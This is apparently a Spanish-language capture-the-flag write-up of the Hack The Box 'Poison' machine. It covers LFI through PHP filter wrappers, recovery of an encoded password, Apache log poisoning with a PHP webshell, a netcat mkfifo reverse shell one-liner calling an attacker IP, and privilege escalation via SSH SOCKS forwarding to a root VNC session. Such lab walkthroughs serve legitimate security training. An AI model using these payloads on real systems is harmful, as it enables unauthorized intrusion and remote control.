# Poison-HTB


## NMAP

Puertos abiertos 80 y 22 tcp.

```
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
```

Ya desde ahi podemos ver que es un SO FreeBSD.


## Whatweb

Hay que hacer reconcomimiento lo mas que se pueda.

```
http://10.129.1.254/ [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.4.29 (FreeBSD) PHP/5.6.32], IP[10.129.1.254], PHP[5.6.32], X-Powered-By[PHP/5.6.32]
```

## LFI

![image](https://github.com/gecr07/Poison-HTB/assets/63270579/86afd3c4-8ed7-4fba-9ba2-18ace1715a78)


Entontramos un archivo que parece que incluye archivos intentamos esta vulnerabilidad.Nos damos cuenta que existe un usuario llamado charix.

![image](https://github.com/gecr07/Poison-HTB/assets/63270579/b3de55d0-ee7b-467f-b199-8bcb4c0bbc5a)


Y ahi podemos checar todos los archivos que vienen ahi y encontramos un pwbackup.txt. Nos da una clave ( intenta siempre todas las posibilidades) Yo pense que era un ROT13 y no un base64 encodeado 13 veces.

```
Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=

```

### CyberChef

> https://gchq.github.io/CyberChef/

Yo creo que desde hoy siempre voy a hacer un doble check con esta pagina ( osea lo que logres sacar con herramientas de la consola lo intentas ahi)

![image](https://github.com/gecr07/Poison-HTB/assets/63270579/9435cf1c-34d0-4d6e-8078-8c59437478ac)



### Paths para Fuzzing

Este Repositorio tiene muchos paths para hacer fuzzing para esta maquina me confie y no venia el que si era intenta paths en especifico y luego estos.

> https://github.com/jstigerwalt/WEB-Fuzz

### PHP Wrappers

Para este ejemplo usamos el wrapper de base64 el cual nos pemitio traernos el codigo de todos los archivos que estan ahi.


```
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

browse.php vamos a ver este archivo como funciona.

![image](https://github.com/gecr07/Poison-HTB/assets/63270579/310620d6-78a3-496a-ab91-33bf32f03d9c)


![image](https://github.com/gecr07/Poison-HTB/assets/63270579/3cff8cd7-100f-4a11-ac8f-fd9c1c07a31e)


Solo es un include entonces podemos envenenar los logs de apache lo que haria alucion al nombre de la maquina.


## RCE

Buscamos "where-are-apache-file-access-logs-stored" for FreeBSD:

> https://unix.stackexchange.com/questions/38978/where-are-apache-file-access-logs-stored

```
/var/log/httpd-access.log
```

![image](https://github.com/gecr07/Poison-HTB/assets/63270579/541d7930-5d5b-4966-95fb-b0b0ca1fba11)


Podriamos embenenar el log.

```
<?php system($_GET['cmd']); ?>

```

### Log Poison 

![image](https://github.com/gecr07/Poison-HTB/assets/63270579/04001dca-e70e-49a3-95e6-0d8fe73d8539)

Ahora si ponemos ese cmd en el log como intenta interpretar php nos permite ejecutar comandos. Algo importante fijate como no usas el ? si no el & porque lo trata como parametro.

### Netcat una version antigua que no tiene el -e activado

Ahi en monkeypentester existe una opcion de netcat que no requiere el -e. RECUERDA LOS AMPERSANT SIEMPRE JODEN REMPLAZALOS POR %26.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.102 1234 >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.102 1234 >/tmp/f
```

Con el %26 (URL encode del &) 


![image](https://github.com/gecr07/Poison-HTB/assets/63270579/511b1a48-ea10-4721-a42b-8c9a3378db1b)

Como Tarea se podra envenenar ese log de otras maneras ¿?

## RCE2

Tenemos un puerto 22 un usuario y una contraseña nos conectamos por ssh y si se puede esta es otra manera de resolverla.

![image](https://github.com/gecr07/Poison-HTB/assets/63270579/39adbadc-da21-414c-a949-07e7dc69ef83)

Existe un archivo secrets.zip nos lo traemos

```
zip2jonh > hash
jonh -w rockyou.txt hash
fcrackzip

Charix!2#4%6&8(0

```

Pero no esta ahi la contraseña por lo que utilizamos la contraseña del usuario que ya tenemos (siempre prueba la re utilizacion de contraseñas).


## Privilege Escalation

Enumeramos un poco la maquina y nos damos cuenta que estan en escucha pero solo local los puertos 5801 y 5901 ( esto lo hice con el linpeas pero igual lo resumi)

![image](https://github.com/gecr07/Poison-HTB/assets/63270579/21a3bf9f-6bd0-4218-ac6e-9adcb7cac5cb)

Enumeramos proceso

```
ps -faux

```
![image](https://github.com/gecr07/Poison-HTB/assets/63270579/772407c1-0441-4a86-b2e9-4aae064972ea)



Buscando en internet vemos que esos puertos los  usa el xvnc ( y aparte ese proceso corre como root). Algo importante fijate en el programa tightvnc (paquete investigalo bien)

![image](https://github.com/gecr07/Poison-HTB/assets/63270579/6fe882a9-1925-4acf-aa86-00362885abbf)

Si buscas "Kali Xvnc" nos sale como instalar este paquete que no es mas que un VNC.



### Dynamic portfowarding

Vamos a exponer los puertos que se necesitan para la conexion de la vnc.


```
ssh charix@10.129.1.254 -D 1080


```

En la configuracion del proxychains.


![image](https://github.com/gecr07/Poison-HTB/assets/63270579/941221e5-6c4a-4032-8b01-1d36ad246fee)

Checamos antes de poner puerto

```
lsof -i:1080
#No hay nada pero ya despues si.

```
![image](https://github.com/gecr07/Poison-HTB/assets/63270579/8c7129d5-0ec1-4db7-b50c-93a85e042357)

> https://www.kali.org/tools/tightvnc/

![image](https://github.com/gecr07/Poison-HTB/assets/63270579/d95ebf72-9831-4ae4-9081-77bf0259e02d)


La explicacion es le decimos al proxychains que mande todo por el puerto 1080 como nos conectamos con el -D 1080 esta ligado al puerto de la maquina como creamos un socks4 entonces ahora nos trajimos todos los puertos. Nuesta maquina (proxychains) ---> (-D 1080) Victima --> acceso a todos los puertos. Entonces para usarlos mis puertos en 127.0.0.1:ports serian sus puertos ya sabes.

```
proxychains xtightvncviewer 127.0.0.1:5901 -passwd secret
```
Esto nos lanza una cosola de root y listo.

![image](https://github.com/gecr07/Poison-HTB/assets/63270579/58ea5e65-4f1b-4c97-a119-e138d75ca681)









